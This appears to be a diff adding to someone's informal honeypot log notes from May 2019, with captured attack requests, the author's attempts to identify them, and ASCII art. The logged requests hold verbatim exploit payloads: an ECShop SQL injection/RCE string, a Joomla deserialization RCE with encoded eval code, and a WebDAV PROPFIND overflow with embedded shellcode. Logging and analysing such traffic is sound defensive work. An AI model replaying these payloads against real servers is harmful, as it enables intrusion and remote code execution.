@@ -237,3 +237,130 @@ ooh masscan??
 "user-agent": "masscan/1.0 (https://github.com/robertdavidgraham/masscan)",
 funny enough, some of these ips are noted for their bruteforce attempts:
 http://bruteforcers.net/592446
+
+
+yet another interesting request:
+URL: http(s)://54.204.62.167/%75%73%65%72%2e%70%68%70
+2019:05:21:02:10:01
+{
+  "referer": "554fcae493e564ee0dc75bdf2ebf94caads|a:3:{s:2:\"id\";s:3:\"'/*\";s:3:\"num\";s:141:\"*/ union select 1,0x272F2A,3,4,5,6,7,8,0x7b247b24524345275d3b6469652f2a2a2f286d6435284449524543544f52595f534550415241544f5229293b2f2f7d7d,0--\";s:4:\"name\";s:3:\"ads\";}554fcae493e564ee0dc75bdf2ebf94ca",
+  "user-agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0",
+  "host": "54.204.62.167",
+  "content-length": "0",
+  "connection": "Keep-Alive",
+  "cache-control": "no-cache"
+}
+
+url decoded is to user.php,
+referer references some hashes which upon googling yields:
+https://github.com/vulhub/vulhub/tree/master/ecshop/xianzhi-2017-02-82239600
+which is an sql injection/rce vuln in EC2Shop which is a B2C independent Chinese shop system.
+cool.
+May 20th, 2019
+
+                       .,,uod8B8bou,,.
+              ..,uod8BBBBBBBBBBBBBBBBRPFT?l!i:.
+         ,=m8BBBBBBBBBBBBBBBRPFT?!||||||||||||||
+         !...:!TVBBBRPFT||||||||||!!^^""'   ||||
+         !.......:!?|||||!!^^""' home port  ||||
+         !.........||||       is            ||||
+         !.........||||  ##1337             ||||
+         !.........||||                     ||||
+         !.........||||                     ||||
+         !.........||||                     ||||
+         !.........||||                     ||||
+         `.........||||                    ,||||
+          .;.......||||               _.-!!|||||
+   .,uodWBBBBb.....||||       _.-!!|||||||||!:'
+!YBBBBBBBBBBBBBBb..!|||:..-!!|||||||!iof68BBBBBb....
+!..YBBBBBBBBBBBBBBb!!||||||||!iof68BBBBBBRPFT?!::   `.
+!....YBBBBBBBBBBBBBBbaaitf68BBBBBBRPFT?!:::::::::     `.
+!......YBBBBBBBBBBBBBBBBBBBRPFT?!::::::;:!^"`;:::       `.
+!........YBBBBBBBBBBRPFT?!::::::::::^''...::::::;         iBBbo.
+`..........YBRPFT?!::::::::::::::::::::::::;iof68bo.      WBBBBbo.
+  `..........:::::::::::::::::::::::;iof688888888888b.     `YBBBP^'
+    `........::::::::::::::::;iof688888888888888888888b.     `
+      `......:::::::::;iof688888888888888888888888888888b.
+        `....:::;iof688888888888888888888888888888888899fT!
+          `..::!8888888888888888888888888888888899fT|!^"'
+            `' !!988888888888888888888888899fT|!^"'
+                `!!8888888888888888899fT|!^"'
+                  `!988888888899fT|!^"'
+                    `!9899fT|!^"'
+                      `!^"'
+
+What exploit is this referencing? There was a previously similar request but with a different
+user agent...
+URL: http(s)://54.204.62.167/
+2019:05:22:01:11:47
+GET
+{
+  "user-agent": "}__test|O:21:\"JDatabaseDriverMysqli\":3:{s:2:\"fc\";O:17:\"JSimplepieFactory\":0:{}s:21:\"\\0\\0\\0disconnectHandlers\";a:1:{i:0;a:2:{i:0;O:9:\"SimplePie\":5:{s:8:\"sanitize\";O:20:\"JDatabaseDriverMysql\":0:{}s:8:\"feed_url\";s:277:\"eval(chr(100).chr(105).chr(101).chr(40).chr(109).chr(100).chr(53).chr(40).chr(68).chr(73).chr(82).chr(69).chr(67).chr(84).chr(79).chr(82).chr(89).chr(95).chr(83).chr(69).chr(80).chr(65).chr(82).chr(65).chr(84).chr(79).chr(82).chr(41).chr(41).chr(59));JFactory::getConfig();exit\";s:19:\"cache_name_function\";s:6:\"assert\";s:5:\"cache\";b:1;s:11:\"cache_class\";O:20:\"JDatabaseDriverMysql\":0:{}}i:1;s:4:\"init\";}}s:13:\"\\0\\0\\0connection\";b:1;}ðýýý",
+  "host": "54.204.62.167",
+  "connection": "Keep-Alive",
+  "cache-control": "no-cache"
+}
+::ffff:123.206.85.211
+
+decoding the referenced ascii char codes: 100 105 101 40 109 100 53 40 68 73 82 69 67 84 79 82 89 95 83 69 80 65 82 65 84 79 82 41 41 59
+yields:
+die(md5(DIRECTORY_SEPARATOR));
+googling the user agent reveals: https://security.stackexchange.com/questions/117433/i-think-my-site-was-hacked-can-someone-explain-the-get-http-1-0-garbage-in
+which looks like a json deserialize rce exploit attempt for joomla
+googling the decoded php function line: https://curiousprog.com/2018/10/03/a-wordpress-die-md5-exploit/
+
+Another crazy request:
+URL: http(s)://localhost/
+2019:05:21:14:39:13
+PROPFIND
+{
+  "host": "localhost",
+  "connection": "Close",
+  "content-length": "0",
+  "if": "<http://localhost/aaaaaaaæ½¨ç¡£ç¡ç³æ¤¶ä²ç¨¹ä­·ä½°çç©ä¡¨å£æµæ¡ã¥å¬å§æ£ã¤ä°ç¡æ¥å±ä±æ©çä±çµå¡ã¤æ±ã¹åªå´åçå¡ã²æµæ°´ãæãå¡å¡¢ä³åã°çæ¡ªã´ä¹ç¡«ä¥¶ä¹³ä±ªåºæ½±å¡ã°ã®ä­åä¡£æ½ççµæ¯ç¨äå°ç¨¶ææçæ©²ç©«ç¢çææ±ãæ±¹åå¢å³ã·æ©·äã´æ¶äµåä¬æç²ç¸å©ä¸æ²å¨°å¤¸åÈÈáæ æ±åä¬·æ±­ä½å¡ç¥ä¥ªå¡ä©äæáæ ä ´æ±æ½æ¹¦çä¬áæ åæ©çã°å¡¦äçæå³ç¥ç©ä©¬> (Not <locktoken:write1>) <http://localhost/bbbbbbbç¥æµä½æ½§æ­¯ä¡ãæµä³ã¡±å¥å©¢åµå¡æ¥æ©åã¡å¥æä¥±ä¤æ²ã¨äç¹ã«æ­æµåç©ã±æ½çå¥æ½¯çãæ¨ç©²ãäµååä°¸ãºã²æ¦æ¹ä¡­ãæ·äµæ´ä³ä¥å²æµ©ã±ä¹¤æ¸¹ææ­¤åä¼°ç¡¯çæäç©£ç¹ä½äæ¼¶ç¹æ¡·ç©æã¥ã¹æ°¹ä±ã²å¥å¡äç©æ°µå©ææ¹²æ±å¥å³ãå¡¥å¥çã¶å·äå¡áæ æ¹æ æ¹æ äçªáæ ää½´å¥å´ä­¦ä­ç¤ç¡¯ææ åµçºçºäµäåëæ ã¶æ¹¯â£æ á æ Ìç¿¾ï¿¿ï¿¿áæ Ñ®æ ç®ç°á´æ â§§æ éæ ã¤±æ®ä¥ãå«ç«çç¥¡áæ æ¸æ ç²ç¥¨äµ©ã¬ä¨äµ°èæ ä¡·ãá¶ªæ æ½ªäµá¸æ â§§æ VVYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIAIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYAZBABABABABkMAGB9u4JB9lk8sYkPkPypC0CY7uNQfr1TdKNrP0TKPRlLDKaBMDtKqbkxjoh70JNFP1yoP17PDlMls1QlYrnLmP7QXOlMZaI7K2hp22Nw4KqBjpBk12oLKQJ02kq03HE5WPQdOZm18PB0tKMxlXbk0XO0m1j3zCml0IrkLt2kiqxVnQYo01upvLva6ojmyqfgLxyPd5Xt9sQmHxoKqmLdSExbnxBk1Ho49qXSC6rkjlpK2kb8mLja8SDKjdDKKQ6pu90DmTNDaKqKOq1IPZr19ogpOhOo0ZtKzrXksVomqXPnc5qdm0ph1g2IPn0i2iJFR40hPLsGKvIwIoz5P1ioNwaGnw0WofRHnZofSIuWioJ5XkOpQKlqy921nqPjkSoanqrJPPr3r0Ph27ayCoev9oYEXk0OqImaFrNrBHkPp2aPtDNrNrB2r10Rb0S8hknunNoKkOZ5E96faZjp1KRHaplsipKPQygprJm4R0BJkoNvrHQenfeNTFIoiE019oogogNw27QF2HNMjfJxsKkOIEbeupqeMVNkZordu3kPM09pHkXQwyVDYpKPKPK8fLyoKOyonOpibMpa1W2Ed3NO1Qc2RCnONdpLnN0pS82PkPXkRKMay0Oo20BJm20jm2B01ZYrpjM20Wc88ZYfYJpO9o6u63MawP2FfXkTm3O9i4r4BmnlO4m8ma90vTLC2021ofc8LRV62iiRYoYEReEpqdLmNxu5EprTJvqZm0OdR0bmoTo4jl0Pb3bHLm1GFN1Kiovuu3JL9tHkXNpSc8FfRvqwnryoWeRJYpqGbHlq2kBOqwiovuaZkPBHXpee3rqFIo9EXhdPIoyo9oMsmjnOnOnrS5RC1ic3RLbE0rloloBS2VOsph2O2SsDlns51hPeIphhIbKNioKOp109OBLnmaP4mdlnP105P0nNNQoHLxkPAA>"
+}
+::ffff:39.106.146.60
+
+what is PROPFIND http method? webdav? I don't know what to make of whatever this is
+attempting to exploit.
+
+Couple of requests where url was masked somehow or not reported correctly:
+URL: http(s)://www.ip138.comhttp://www.ip138.com/
+2019:05:22:04:27:13
+GET
+{
+  "accept": "text/html, application/xhtml+xml, */*",
+  "accept-language": "zh-CN",
+  "user-agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
+  "accept-encoding": "gzip, deflate",
+  "proxy-connection": "Keep-Alive",
+  "host": "www.ip138.com",
+  "cookie": "pgv_pvi=5123233984"
+}
+::ffff:115.238.34.21
+
+ip138 looks like a Chinese ip whois tool
+May 21, 2019
+                                            , ,
+                                          ,','
+                                         ; ;
+                                         `.`.
+                                           ) ;
+            SPEED                     ,,,-','
+        IS              _____,,,,---''",,,-'
+    DPS       ___,,--'""_____,,,,--''""
+     __,,--'"__,,--'"""
+  ,-"_,,--'""
+ ; ,'               .,------,....___  
+ ; ;               /       ;        """`---.._
+ `.``-.._____,,,,,/       ;                   ""``.
+   ``--...___;;;;/-"""""-;                         \
+             ```;        ;                         ;;
+               ;        ;                         / ;
+              ;"----....;___                     ; ;;
+              ;-,,,,,___    ""`"--..._         ,' ; ;
+              ;         """"``---...__""-...,-' ,'  ;
+              ;                       "`-....,-'   /
+              `-._     _-------_                 ,'
+                  "`--'"""""""""``--..        ,,'
+                                      ""`---'"
